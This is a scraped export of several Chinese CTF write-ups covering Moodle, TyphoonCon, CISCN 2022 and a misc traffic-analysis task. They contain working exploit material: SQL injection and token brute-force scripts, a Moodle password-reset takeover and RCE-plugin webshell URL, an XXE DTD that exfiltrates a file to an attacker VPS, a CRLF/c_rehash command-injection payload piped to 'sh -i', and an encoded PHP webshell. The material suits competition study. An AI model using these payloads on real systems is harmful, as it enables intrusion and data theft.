Ubuntu 20.04 or 19.10 (focal or eoan) web application technology: Apache 2.4.41 back-end DBMS: MySQL \u0026gt;= 5.0 (MariaDB fork) Database: moodle [428 tables] +----------------------------------+ | mdl_analytics_indicator_calc | | mdl_analytics_models | | mdl_analytics_models_log | 。。。。。。。。。。。。。。。。。 | mdl_tool_recyclebin_category | | mdl_tool_recyclebin_course | | mdl_tool_usertours_steps | | mdl_tool_usertours_tours | | mdl_upgrade_log | | mdl_url | | mdl_user | | mdl_user_devices | | mdl_user_enrolments | | mdl_user_info_category | | mdl_user_info_data | | mdl_user_info_field | | mdl_user_lastaccess | | mdl_user_password_history | | mdl_user_password_resets | | mdl_user_preferences | | mdl_user_private_key | | ............. +----------------------------------+   这里本地搭建了一个moodle来调试\n这里前端只有一个功能点，就是重置密码，他会要求你写一个邮箱，然后发送修改密码的连接给你，所以我猜测是不是可以去构造这个链接，而且在dump出几个表来看，只有这个表mdl_user_password_resets存在一些数据\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27  Database: moodle Table: mdl_user_password_history [0 entries] +----+--------+------+-------------+ | id | userid | hash | timecreated | +----+--------+------+-------------+ +----+--------+------+-------------+ Database: moodle Table: mdl_user_password_resets [1 entry] +----+--------+----------------------------------+---------------+-----------------+ | id | userid | token | timerequested | timererequested | +----+--------+----------------------------------+---------------+-----------------+ | 1 | 2 | OmPAvhUALIvcQcX4fSxx8P0BzcKcSoVG | 1659191821 | 1659191987 | +----+--------+----------------------------------+---------------+-------------- Database: moodle Table: mdl_user_private_key [0 entries] +----+--------+--------+---------+----------+------------+-------------+---------------+ | id | userid | script | value | instance | validuntil | timecreated | iprestriction | +----+--------+--------+---------+----------+------------+-------------+---------------+ +----+--------+--------+---------+----------+------------+-------------+---------------+   这里进行代码审计，首先在跟进这里\n然后进到这里，这里会有个判断，必须保证token绑定了user，而且时间在半小时内\n在本地环境测试下，我通过发送重置密码邮件，就可以更新mdl_user_password_resets里面的token和时间\n这里我直接盲测了一下，直接发只有token参数的数据，因为缺少参数，这里发现跳转到了修改密码的界面\n手动修改密码后登录，本地环境成功登录admin\n然后在history里面找到完整的payload，不过这个sesskey是有时限的，所以还是手改就好\n1  token=Lk7GF0p9gAinTlkPPyMA4ZJ9Hc6v6Fly\u0026amp;sesskey=h9zVdXkSLf\u0026amp;_qf__login_set_password_form=1\u0026amp;username=admin\u0026amp;password=Admin%40123\u0026amp;password2=Admin%40123\u0026amp;submitbutton=%E4%BF%9D%E5%AD%98%E6%9B%B4%E6%94%B9   然后到远程来打，首先sql注入拿到管理员的邮箱，这里找到的是admin@localhost.com\n然后发包修改免密进入到后台\n这个moodle版本是3.9.1，后台是可以getshell的，这里通过加载一个插件去getshell\n我用的现成的\nhttps://github.com/HoangKien1020/Moodle_RCE\n安装这个rce插件即可\n然后find找flag即可\n1  http://47.105.52.19:8888/blocks/rce/lang/en/block_rce.php?cmd=grep -r \u0026#39;flag{.*}\u0026#39; /etc   ","date":"2022-07-31T20:35:47+08:00","permalink":"https://example.com/post/qwb2022/","title":"[2022强网杯] WP"},{"content":"KnowMe 首先是扫了个目录，发现了robots.txt\n1 2  /items.php /var/www/flag   这里的items.php是一个查询接口\n经测试是order by的盲注，这里我写了个脚本，这里只展示到最后查询密码\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16  import requests import string strings = \u0026#34;abcdef1234567890\u0026#34; url = \u0026#34;https://typhooncon-knowme.chals.io/items.php?sort=rand(substr((select/**/group_concat(password)/**/from/**/users),{},1)=\u0026#39;{}\u0026#39;)\u0026#34; flag = \u0026#39;\u0026#39; for i in range(80): for s in strings: fuckurl = url.format(i,s) res = requests.get(url=fuckurl).text if \u0026#39;\u0026#34;id\u0026#34;:2\u0026#39; in res: flag+=s print(flag) else : print(\u0026#34;-\u0026#34;,end=\u0026#34;\u0026#34;)   注出来，admin密码md5：d41d8cd98f00b204e9800998ecf8427e\n解出来是空\n只需要bp进行前端限制的绕过即可，然后就会跳转到profile.php\n进行文件上传，这里只允许上传图片，且是白名单，这里直接上传1.png.php即可绕过，估计这里的逻辑判断只取了第一个点后面的后缀\n直接传shell后拿flag\n进去拿到了源码后，的确是这样的逻辑\nTypo step1 给了赛题文件，这里是有一个登录的操作的，但是很多的路由都需要登录，只有change.php和forgot.php不需要登录\n在change.php里面，这里会通过uid查询一个token，而这里的token进行了一个substr，只取了前4位\n所以这样我们是可以尝试爆破的\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17  $uid = mysqli_real_escape_string($mysqli, $_POST[\u0026#39;uid\u0026#39;]); $pwd = md5(mysqli_real_escape_string($mysqli, $_POST[\u0026#39;psw\u0026#39;])); $sig = mysqli_real_escape_string($mysqli, $_POST[\u0026#39;token\u0026#39;]); $sqlGetTokens = \u0026#34;SELECT token from tokens where uid=\u0026#39;$uid\u0026#39;\u0026#34;; $result = $mysqli-\u0026gt;query($sqlGetTokens); $data = mysqli_fetch_array($result); $sigDB = substr($data[0], 0, 4); if( $sig == $sigDB ){ $sqlChange = \u0026#34;UPDATE users SET password=\u0026#39;$pwd\u0026#39; where id=\u0026#39;$uid\u0026#39;\u0026#34;; $mysqli-\u0026gt;query($sqlChange); $sqlDelete = \u0026#34;DELETE FROM tokens WHERE uid=\u0026#39;$uid\u0026#39;\u0026#34;; $mysqli-\u0026gt;query($sqlDelete);   但是直接爆破难度有点大，这里就可以利用forget.php的功能\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20  if($_SERVER[\u0026#39;REQUEST_METHOD\u0026#39;] == \u0026#34;POST\u0026#34;){ $uname = mysqli_real_escape_string($mysqli, $_POST[\u0026#39;uname\u0026#39;]); $s = system(\u0026#34;date +%s%3N \u0026gt; /tmp/time\u0026#34;); $time = file_get_contents(\u0026#34;/tmp/time\u0026#34;); $fullToken = md5( $unam . $time . \u0026#34;SECRET\u0026#34; ); $sqlGetId = \u0026#34;SELECT id FROM users where username=\u0026#39;$uname\u0026#39;\u0026#34;; $result = $mysqli-\u0026gt;query($sqlGetId); $data = mysqli_fetch_array($result); $uid = $data[0]; $sqlDelete = \u0026#34;DELETE FROM tokens WHERE uid=\u0026#39;$uid\u0026#39;\u0026#34;; $mysqli-\u0026gt;query($sqlDelete); $sqlInsert = \u0026#34;INSERT INTO tokens values(\u0026#39;$uid\u0026#39;,\u0026#39;$fullToken\u0026#39;)\u0026#34;; $mysqli-\u0026gt;query($sqlInsert); die(\u0026#34;\u0026lt;script\u0026gt;alert(\u0026#39;Token sent to you.\u0026#39;);window.location.href=\u0026#39;/index.php\u0026#39;;\u0026lt;/script\u0026gt;\u0026#34;); }   这里会基于uname，time，”SECRET“生成一个md5，然后我发现这里真是写错了个单词$unam。。。\n所以这里fullToken就会是md5(time+\u0026ldquo;SECRET\u0026rdquo;)了，如果爆破点放在token上，那么我们确实是有可能爆破出来的，但是比赛的时候很多人都会做这个题目，所以time会经常变化，这让我们爆破的难度有点大\n而对于这个time是可以变化的，每次POST访问forget的时候，这里就会刷新time，所以说之类我们可以利用php不严格的判断，让time进行变化，当变成0exxxxx的时候，这时候我们把sig赋值为0000就能让条件$sig == $sigDB满足\n写个脚本来进行爆破\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25  import requests target = \u0026#34;https://typhooncon-typo.chals.io\u0026#34; passwd = \u0026#34;hack\u0026#34; data1 = { \u0026#34;uname\u0026#34;: \u0026#34;admin\u0026#34; } data2 = { \u0026#34;uid\u0026#34;: \u0026#34;1\u0026#34;, \u0026#34;psw\u0026#34;: passwd, \u0026#34;token\u0026#34;: \u0026#34;0000\u0026#34; } while True: try: res = requests.post(f\u0026#34;{target}/forgot.php\u0026#34;, data1) print(res.text) res = requests.post(f\u0026#34;{target}/change.php\u0026#34;, data2) print(res.text) if \u0026#34;Password Changed.\u0026#34; in res.text: print(passwd) break except: pass   爆破的结果，成功更改密码\n拿到cookie：PHPSESSID=ql32dudasjts4rjbsctj0vrvqd\nstep2 这里到了profile.php，存在一个xml的使用，猜测这里是存在一个xxe的\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23  \u0026lt;script type=\u0026#34;text/javascript\u0026#34;\u0026gt; xhr = new XMLHttpRequest() xhr.onreadystatechange = function(){ document.getElementById(\u0026#34;email\u0026#34;).innerHTML = \u0026#34;E-Mail: \u0026#34;+this.responseText } xhr.open(\u0026#34;get\u0026#34;,\u0026#34;data.php?u=\u0026lt;?php echo $uname;?\u0026gt;\u0026#34;) xhr.send() function read(){ var xml = \u0026#39;\u0026lt;\\?xml version=\u0026#34;1.0\u0026#34; encoding=\u0026#34;UTF-8\u0026#34;?\u0026gt;\u0026lt;user\u0026gt;\u0026lt;username\u0026gt;\u0026#39;+document.getElementById(\u0026#34;user\u0026#34;).value+\u0026#39;\u0026lt;/username\u0026gt;\u0026lt;/user\u0026gt;\u0026#39; var xhr = new XMLHttpRequest() xhr.onreadystatechange = function(){ var out = document.getElementById(\u0026#34;output\u0026#34;) out.value = this.responseText } xhr.open(\u0026#34;post\u0026#34;,\u0026#34;read.php\u0026#34;) // \txhr.setRequestHeader(\u0026#34;UUID\u0026#34;, document.getElementById(\u0026#34;uuid\u0026#34;).value) xhr.setRequestHeader(\u0026#34;Content-Type\u0026#34;, \u0026#34;application/x-www-form-urlencoded\u0026#34;) xhr.send(\u0026#34;data=\u0026#34;+encodeURIComponent(xml)) } \u0026lt;/script\u0026gt;   但是这里需要有一个UUID，我们再更进看一下read.php\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20  $uuid = $_SERVER[\u0026#39;HTTP_UUID\u0026#39;]; if( $uuid != \u0026#34;XXXX\u0026#34; ){ die(\u0026#34;UUID is not valid\u0026#34;); } include \u0026#39;database.php\u0026#39;; $xml = urldecode($_POST[\u0026#39;data\u0026#39;]); $dom = new DOMDocument(); try{ @$dom-\u0026gt;loadXML($xml, LIBXML_NOENT | LIBXML_DTDLOAD); }catch (Exception $e){ echo \u0026#39;\u0026#39;; } $userInfo = @simplexml_import_dom($dom); $output = \u0026#34;User Sucessfully Added.\u0026#34;; $user = mysqli_real_escape_string($mysqli, @$userInfo-\u0026gt;username); $sql = \u0026#34;select * from users where username=\u0026#39;$user\u0026#39;\u0026#34;;   这里会对uuid进行一个判断，才会进一步的加载xml，所以我们的获取到这个uuid，这里我们还有个文件没看，那就是data.php，可以看到这里的sql查询是没有增加过滤的，所以我们在这里进行一个sql注入\n1 2 3 4 5 6 7 8 9 10  $uname = $_GET[\u0026#39;u\u0026#39;]; $sql = \u0026#34;SELECT email FROM users where username=\u0026#39;$uname\u0026#39;\u0026#34;; if( $result = $mysqli-\u0026gt;query($sql) ){ $data = @mysqli_fetch_array($result); $email = $data[0]; echo $email; }else{ echo \u0026#34;Erorr\u0026#34;; }   这里直接用sqlmap一把嗦\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26  available databases [5]: [*] information_schema [*] mysql [*] performance_schema [*] sys [*] typodb Database: typodb [3 tables] +------------+ | secretkeys | | tokens | | users | +------------+ Database: typodb Table: secretkeys [1 entry] +--------------------------------------+ | uuidkey | +--------------------------------------+ | 8d6ed261-f84f-4eda-b2d2-16332bd8c390 | +--------------------------------------+   拿到uuid，这样我们就可以构造xxe进行攻击了，但是有个问题，这里没有回显，所以我们得在自己vps搭建个，我的payload参考此处\nvps放一个dtd.xml\n1 2  \u0026lt;!ENTITY % data SYSTEM \u0026#34;php://filter/convert.base64-encode/resource=/var/www/flag\u0026#34;\u0026gt; \u0026lt;!ENTITY % param1 \u0026#34;\u0026lt;!ENTITY exfil SYSTEM \u0026#39;http://ip:port/dtd.xml?%data;\u0026#39;\u0026gt;\u0026#34;\u0026gt;   起一个python服务\n1  python3 -m http.server 11111   curl发包\n1  curl -X POST https://typhooncon-typo.chals.io/read.php -H \u0026#34;UUID: 8d6ed261-f84f-4eda-b2d2-16332bd8c390\u0026#34; -H \u0026#34;Cookie: PHPSESSID=ql32dudasjts4rjbsctj0vrvqd\u0026#34; -d \u0026#34;data=%3C%3Fxml%20version%3D%221%2E0%22%20encoding%3D%22UTF%2D8%22%3F%3E%0A%3C%21DOCTYPE%20r%20%5B%0A%3C%21ELEMENT%20r%20ANY%20%3E%0A%3C%21ENTITY%20%25%20sp%20SYSTEM%20%22http%3A%2F%2F[ip]%2Fdtd%2Exml%22%3E%0A%25sp%3B%0A%25param1%3B%0A%5D%3E%0A%3Cr%3E%26exfil%3B%3C%2Fr%3E%0A%3Cuser%3E%3Cusername%3Eadmin%3C%2Fusername%3E%3C%2Fuser%3E\u0026#34;   成功带出flag\n","date":"2022-06-25T22:46:06+08:00","permalink":"https://example.com/post/typhoonconctf2022/","title":"[TyphoonCon CTF 2022] WP"},{"content":"ikari 在index.php里面有这么一段代码\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15  try { require ROOT_PATH . \u0026#39;Engine/Loader.php\u0026#39;; E\\Loader::getInstance()-\u0026gt;init(); // Load necessary classes  $aParams = [\u0026#39;ctrl\u0026#39; =\u0026gt; (!empty($_GET[\u0026#39;p\u0026#39;]) ? $_GET[\u0026#39;p\u0026#39;] : \u0026#39;blog\u0026#39;), \u0026#39;act\u0026#39; =\u0026gt; (!empty($_GET[\u0026#39;a\u0026#39;]) ? $_GET[\u0026#39;a\u0026#39;] : \u0026#39;index\u0026#39;), \u0026#39;template\u0026#39; =\u0026gt; (!empty($_GET[\u0026#39;t\u0026#39;]) ? $_GET[\u0026#39;t\u0026#39;] : \u0026#39;pc\u0026#39;), \u0026#39;ns\u0026#39; =\u0026gt; (!empty($_GET[\u0026#39;n\u0026#39;]) ? $_GET[\u0026#39;n\u0026#39;] : \u0026#39;TestProject\\Controller\\\\\u0026#39;)]; E\\Router::run($aParams); } catch (\\Exception $oE) { echo $oE-\u0026gt;getMessage(); } ?\u0026gt;  我们跟进Router去看看\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45  class Router { public static function run (array $aParams) { if($aParams[\u0026#39;ns\u0026#39;] != \u0026#39;TestProject\\Controller\\\\\u0026#39;){ $sNamespace = $aParams[\u0026#39;ns\u0026#39;]; $sCtrlPath = $sNamespace; }else{ $sNamespace = \u0026#39;TestProject\\Controller\\\\\u0026#39;; $sDefCtrl = $sNamespace . \u0026#39;Blog\u0026#39;; $sCtrlPath = ROOT_PATH . \u0026#39;Controller/\u0026#39;; } if($aParams[\u0026#39;ns\u0026#39;] == \u0026#39;\\\\\u0026#39;){ $aParams[\u0026#39;ctrl\u0026#39;] = \u0026#39;\\\\system\u0026#39;; if(preg_match(\u0026#39;/^[a-zA-Z0-9\\/]*$/\u0026#39;,$aParams[\u0026#39;act\u0026#39;])){ $aParams[\u0026#39;act\u0026#39;] = \u0026#39;ls /www/\u0026#39;.$aParams[\u0026#39;act\u0026#39;]; }else{ $aParams[\u0026#39;act\u0026#39;] = \u0026#39;ls /www/\u0026#39;; } } $sTemplatePath = str_replace(array(\u0026#34;.\u0026#34;,\u0026#34;\\/\u0026#34;), \u0026#34;\u0026#34;, ROOT_PATH . \u0026#39;Template/\u0026#39; . $aParams[\u0026#39;template\u0026#39;]); include $sTemplatePath; $sCtrl = ucfirst($aParams[\u0026#39;ctrl\u0026#39;]); if (is_file($sCtrlPath . $sCtrl . \u0026#39;.php\u0026#39;) || (substr($sCtrl, 0, 1) === \u0026#39;\\\\\u0026#39;)) { $sCtrl = $sNamespace . str_replace(\u0026#39;\\\\\u0026#39;,\u0026#39;\u0026#39;,$sCtrl); if(class_exists($sCtrl)){ $oCtrl = new $sCtrl; }else{ call_user_func($sCtrl, $aParams[\u0026#39;act\u0026#39;]); exit(); } if ((new \\ReflectionClass($oCtrl))-\u0026gt;hasMethod($aParams[\u0026#39;act\u0026#39;]) \u0026amp;\u0026amp; (new \\ReflectionMethod($oCtrl, $aParams[\u0026#39;act\u0026#39;]))-\u0026gt;isPublic()) call_user_func(array($oCtrl, $aParams[\u0026#39;act\u0026#39;])); else call_user_func(array($oCtrl, \u0026#39;notFound\u0026#39;)); } else { call_user_func(array(new $sDefCtrl, \u0026#39;notFound\u0026#39;)); } } }   这里是对路由的操作，这里，我们可以通过控制参数p选择路由，a选择路由的功能\n在utils里面有这个，这里可以进行文件的包含\n1 2 3 4 5 6 7 8 9 10  public function __get($name) { if(stripos($name,\u0026#39;php\u0026#39;) || stripos($name,\u0026#39;Upload\u0026#39;) || stripos($name,\u0026#39;flag\u0026#39;) || stripos($name,\u0026#39;:\u0026#39;)){ die(\u0026#39;Dangerous Operation.\u0026#39;); }else{ if(file_exists($name)){ require $name; } } }   而这个函数的入口在blog路由下的post方法，这里传一个参数f，进行包含，因为这里对参数有过滤，所以我们选择session_upload进行竞争包含\n1 2 3 4 5 6 7 8 9 10 11  public function post() { if($this-\u0026gt;render == 0){ $this-\u0026gt;oUtil-\u0026gt;oPost = $this-\u0026gt;oModel-\u0026gt;getById($this-\u0026gt;_iId); // Get the data of the post  $this-\u0026gt;oUtil-\u0026gt;getView(\u0026#39;post\u0026#39;); }else{ $this-\u0026gt;oUtil-\u0026gt;__get($_GET[\u0026#39;f\u0026#39;]); } }   xxxcloud 源码中有admin的密码hash，但是解不开，这里的做法是找到token的构造算法，进行手动token生成\n找到token计算算法\n找到systempassword\n计算出token\n然后伪造登录获取flag\n这里的防守不知道应该用什么方式进行防守，如果是伪造token的话，那我们无法避免，因为token算法是写死的，我尝试把这个系统的一个任意文件删除修复，但是任然是exp攻击成功\n后来直接上了个awd的通防waf，没想到还防住了。。\ntemplate 任意文件读取 + 读 opcache缓存\n这里传入tpl参数，赋值为$tpl\n1 2 3  if (isset($_GET[\u0026#39;tpl\u0026#39;]) \u0026amp;\u0026amp; is_string($_GET[\u0026#39;tpl\u0026#39;])): $tpl = $_GET[\u0026#39;tpl\u0026#39;]; endif;   然后在check方法里面，先进行后缀检测，这里过滤的是挺严的\n如果通过了过滤，那么就会进行file_get_contents函数，进行文件读取\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22  private function check() { try{ $arr = explode(\u0026#39;.\u0026#39;, $this-\u0026gt;tpl); $ext = end($arr); if (in_array($ext, [\u0026#39;php\u0026#39;, \u0026#39;php2\u0026#39;, \u0026#39;php3\u0026#39;, \u0026#39;php4\u0026#39;, \u0026#39;php5\u0026#39;, \u0026#39;php6\u0026#39;, \u0026#39;php7\u0026#39;, \u0026#39;phtml\u0026#39;])): return false; endif; $content = file_get_contents($this-\u0026gt;tpl); if (!$content): return false; endif; if ( preg_match(\u0026#39;/script|\u0026lt;\\?/i\u0026#39;, $content) ): return false; endif; } catch (Exception $e) { return false; } return true; }   那我们就可以进行除了php文件外，任意文件的读取了\n这里如果tpl是debug的话，会给phpinfo\n这里是开启了zend_opcache，这里我们利用包含opcache进行攻击\n首先得计算systemid，这个的计算可以利用工具https://github.com/GoSecure/php7-opcache-override/\n然后就是任意文件读取了\nhttp://172.16.9.44:8091/?tpl=..//\u0026hellip;//\u0026hellip;//\u0026hellip;//\u0026hellip;/var/www/cache/1116d566fdc53f79abce6c01e3a0308d/var/www/html/flag.php.bin\n","date":"2022-06-24T20:21:08+08:00","permalink":"https://example.com/post/ciscn2022_half/","title":"[CISCN2022] Semifinals"},{"content":"0x01 前期准备 源码 题目源码用于本地的调试，有所改动，考虑篇幅，只展示重要逻辑代码\napp.py\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37  @app.route(\u0026#39;/getcrt\u0026#39;, methods=[\u0026#39;GET\u0026#39;, \u0026#39;POST\u0026#39;]) def upload(): Country = request.form.get(\u0026#34;Country\u0026#34;, \u0026#34;CN\u0026#34;) Province = request.form.get(\u0026#34;Province\u0026#34;, \u0026#34;a\u0026#34;) City = request.form.get(\u0026#34;City\u0026#34;, \u0026#34;a\u0026#34;) OrganizationalName = request.form.get(\u0026#34;OrganizationalName\u0026#34;, \u0026#34;a\u0026#34;) CommonName = request.form.get(\u0026#34;CommonName\u0026#34;, \u0026#34;a\u0026#34;) EmailAddress = request.form.get(\u0026#34;EmailAddress\u0026#34;, \u0026#34;a\u0026#34;) return get_crt(Country, Province, City, OrganizationalName, CommonName, EmailAddress) @app.route(\u0026#39;/createlink\u0026#39;, methods=[\u0026#39;GET\u0026#39;]) def info(): json_data = {\u0026#34;info\u0026#34;: os.popen(\u0026#34;c_rehash static/crt/ \u0026amp;\u0026amp; ls static/crt/\u0026#34;).read()} return json.dumps(json_data) @app.route(\u0026#39;/proxy\u0026#39;, methods=[\u0026#39;GET\u0026#39;]) def proxy(): uri = request.form.get(\u0026#34;uri\u0026#34;, \u0026#34;/\u0026#34;) client = socket.socket() client.connect((\u0026#39;localhost\u0026#39;, 8887)) msg = f\u0026#39;\u0026#39;\u0026#39;GET {uri}HTTP/1.1 Host: test_api_host User-Agent: Guest Accept-Encoding: gzip, deflate Accept-Language: zh-CN,zh;q=0.9 Connection: close \u0026#39;\u0026#39;\u0026#39; client.send(msg.encode()) data = client.recv(2048) client.close() return data.decode() app.run(host=\u0026#34;0.0.0.0\u0026#34;, port=8888)   main.go\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41  package main import ( \u0026#34;github.com/gin-gonic/gin\u0026#34; \u0026#34;os\u0026#34; \u0026#34;strings\u0026#34; ) func admin(c *gin.Context) { staticPath := \u0026#34;../static/crt/\u0026#34; oldname := c.DefaultQuery(\u0026#34;oldname\u0026#34;, \u0026#34;\u0026#34;) newname := c.DefaultQuery(\u0026#34;newname\u0026#34;, \u0026#34;\u0026#34;) if oldname == \u0026#34;\u0026#34; || newname == \u0026#34;\u0026#34; || strings.Contains(oldname, \u0026#34;..\u0026#34;) || strings.Contains(newname, \u0026#34;..\u0026#34;) { c.String(500, \u0026#34;error\u0026#34;) return } if c.Request.URL.RawPath != \u0026#34;\u0026#34; \u0026amp;\u0026amp; c.Request.Host == \u0026#34;admin\u0026#34; { err := os.Rename(staticPath+oldname, staticPath+newname) if err != nil { return } c.String(200, newname) return } c.String(200, \u0026#34;no\u0026#34;) } func index(c *gin.Context) { c.String(200, \u0026#34;hello world\u0026#34;) } func main() { router := gin.Default() router.GET(\u0026#34;/\u0026#34;, index) router.GET(\u0026#34;/admin/rename\u0026#34;, admin) if err := router.Run(\u0026#34;:8887\u0026#34;); err != nil { panic(err) } }   服务启动 因为flask里直接执行了命令，所以我们得把这个文件放到py文件的同级目录\n接着启动服务，分别执行.\n1 2  python3 app.py go run main.go   0x02 题目逻辑 这里题目的逻辑大致是这样：\n首先通过getcrt路由生成crt文件，然后利用go里的admin/rename去修改文件名，最后利用createlink里的c_rehash执行命令\n可以看到proxy里面，是拼接了一个http包的\n这里不免想到CRLF，进了go里面，那么有这样的条件需要满足\n1 2 3 4 5 6 7 8 9  if c.Request.URL.RawPath != \u0026#34;\u0026#34; \u0026amp;\u0026amp; c.Request.Host == \u0026#34;admin\u0026#34; { err := os.Rename(staticPath+oldname, staticPath+newname) if err != nil { return } c.String(200, newname) return } c.String(200, \u0026#34;no\u0026#34;)   c.Request.URL.RawPath的绕过 首先是c.Request.URL.RawPath，这个的绕过方法是url编码，我们用%252f代替/来绕过这个\n接着是host得是admin，这里我们可以用CRLF来实现\nc_rehash的RCE:CVE-2022-1292 这里是给了c_rehash的源码的，先搜了一下这个cve，找到官方的修复方案，发现是在这里进行了修复\n那么我们就可以对这里分析一下，这里可以从fname这里进行代码注入，类似于这样\n1  1.crt\u0026#34;||id\u0026gt;1.txt||echo\u0026#34;   那么思路就清晰了\n最后逻辑 我们先生成一个crt记录下文件名，然后通过proxy，到go的/admin/rename下，通过CRLF绕过host的判断，把文件名修改成代码注入的样子，最后通过createlink执行c_rehash进行命令执行\n但是最后有一个问题，就是这里fname还是有过滤的，是不能出现斜杠，那么我们就没有办法读取到其他目录下的文件了，这里的绕过逻辑是通过base64进行消敏\n$fname =~ s/\\\u0026quot;/\\\\\\\u0026quot;/g;\npayload：\n1  uri=/admin%252frename?oldname=8c3bcef7-62f5-476c-9c9d-9dc7054a5533.crt%26newname=1.crt\u0026#34;||echo${IFS}\u0026#34;Y2F0IC9mbGFnPnpob25nM2Nj\u0026#34;|base64${IFS}-d|sh${IFS}-i\u0026#34;%20HTTP/1.1%0d%0aHost:%20admin%0d%0a%0d%0aGET%20/   成功修改文件名\n然后再到createlink执行命令\n访问static/crt/1.txt，成功读取到/etc/passwd\ntricks 这里绕过Host判断，可以不用CRLF来绕过，这里可以用http://admin/admin/rename来绕过\n可以看到是可以成功绕过的\n","date":"2022-05-31T01:09:09+08:00","permalink":"https://example.com/post/ciscn2022_crt/","title":"[CISCN2022] online_crt"},{"content":"Misc SimpleFlow 看流量大概是上传了一个后门，但是会对payload加密，这里发现有flag.txt被打包\n后面的包里面发现flag.zip\n但是打开需要密码，那么我们就要回去压缩的地方，看看给的什么密码，所以我们就得解开这个流量\n1 2 3 4 5  @eval(@base64_decode($_POST[\u0026#39;m8f8d9db647ecd\u0026#39;])); \u0026amp;e57fb9c067c677=o3 \u0026amp;g479cf6f058cf8=1DY2QgIi9Vc2Vycy9jaGFuZy9TaXRlcy90ZXN0Ijt6aXAgLVAgUGFTc1ppUFdvckQgZmxhZy56aXAgLi4vZmxhZy50eHQ7ZWNobyBbU107cHdkO2VjaG8gW0Vd \u0026amp;m8f8d9db647ecd=QGluaV9zZXQoImRpc3BsYXlfZXJyb3JzIiwgIjAiKTtAc2V0X3RpbWVfbGltaXQoMCk7ZnVuY3Rpb24gYXNlbmMoJG91dCl7cmV0dXJuICRvdXQ7fTtmdW5jdGlvbiBhc291dHB1dCgpeyRvdXRwdXQ9b2JfZ2V0X2NvbnRlbnRzKCk7b2JfZW5kX2NsZWFuKCk7ZWNobyAiYjYzYmEiLiI3ZGZhMjAiO2VjaG8gQGFzZW5jKCRvdXRwdXQpO2VjaG8gIjgwZSIuIjExYSI7fW9iX3N0YXJ0KCk7dHJ5eyRwPWJhc2U2NF9kZWNvZGUoc3Vic3RyKCRfUE9TVFsibzFmYWViZDRlYzNkOTciXSwyKSk7JHM9YmFzZTY0X2RlY29kZShzdWJzdHIoJF9QT1NUWyJnNDc5Y2Y2ZjA1OGNmOCJdLDIpKTskZW52c3RyPUBiYXNlNjRfZGVjb2RlKHN1YnN0cigkX1BPU1RbImU1N2ZiOWMwNjdjNjc3Il0sMikpOyRkPWRpcm5hbWUoJF9TRVJWRVJbIlNDUklQVF9GSUxFTkFNRSJdKTskYz1zdWJzdHIoJGQsMCwxKT09Ii8iPyItYyBcInskc31cIiI6Ii9jIFwieyRzfVwiIjtpZihzdWJzdHIoJGQsMCwxKT09Ii8iKXtAcHV0ZW52KCJQQVRIPSIuZ2V0ZW52KCJQQVRIIikuIjovdXNyL2xvY2FsL3NiaW46L3Vzci9sb2NhbC9iaW46L3Vzci9zYmluOi91c3IvYmluOi9zYmluOi9iaW4iKTt9ZWxzZXtAcHV0ZW52KCJQQVRIPSIuZ2V0ZW52KCJQQVRIIikuIjtDOi9XaW5kb3dzL3N5c3RlbTMyO0M6L1dpbmRvd3MvU3lzV09XNjQ7QzovV2luZG93cztDOi9XaW5kb3dzL1N5c3RlbTMyL1dpbmRvd3NQb3dlclNoZWxsL3YxLjAvOyIpO31pZighZW1wdHkoJGVudnN0cikpeyRlbnZhcnI9ZXhwbG9kZSgifHx8YXNsaW5lfHx8IiwgJGVudnN0cik7Zm9yZWFjaCgkZW52YXJyIGFzICR2KSB7aWYgKCFlbXB0eSgkdikpIHtAcHV0ZW52KHN0cl9yZXBsYWNlKCJ8fHxhc2tleXx8fCIsICI9IiwgJHYpKTt9fX0kcj0ieyRwfSB7JGN9IjtmdW5jdGlvbiBmZSgkZil7JGQ9ZXhwbG9kZSgiLCIsQGluaV9nZXQoImRpc2FibGVfZnVuY3Rpb25zIikpO2lmKGVtcHR5KCRkKSl7JGQ9YXJyYXkoKTt9ZWxzZXskZD1hcnJheV9tYXAoJ3RyaW0nLGFycmF5X21hcCgnc3RydG9sb3dlcicsJGQpKTt9cmV0dXJuKGZ1bmN0aW9uX2V4aXN0cygkZikmJmlzX2NhbGxhYmxlKCRmKSYmIWluX2FycmF5KCRmLCRkKSk7fTtmdW5jdGlvbiBydW5zaGVsbHNob2NrKCRkLCAkYykge2lmIChzdWJzdHIoJGQsIDAsIDEpID09ICIvIiAmJiBmZSgncHV0ZW52JykgJiYgKGZlKCdlcnJvcl9sb2cnKSB8fCBmZSgnbWFpbCcpKSkge2lmIChzdHJzdHIocmVhZGxpbmsoIi9iaW4vc2giKSwgImJhc2giKSAhPSBGQUxTRSkgeyR0bXAgPSB0ZW1wbmFtKHN5c19nZXRfdGVtcF9kaXIoKSwgJ2FzJyk7cHV0ZW52KCJQSFBfTE9MPSgpIHsgeDsgfTsgJGMgPiR0bXAgMj4mMSIpO2lmIChmZSgnZXJyb3JfbG9nJykpIHtlcnJvcl9sb2coImEiLCAxKTt9IGVsc2Uge21haWwoImFAMTI3LjAuMC4xIiwgIiIsICIiLCAiLWJ2Iik7fX0gZWxzZSB7cmV0dXJuIEZhbHNlO30kb3V0cHV0ID0gQGZpbGVfZ2V0X2NvbnRlbnRzKCR0bXApO0B1bmxpbmsoJHRtcCk7aWYgKCRvdXRwdXQgIT0gIiIpIHtwcmludCgkb3V0cHV0KTtyZXR1cm4gVHJ1ZTt9fX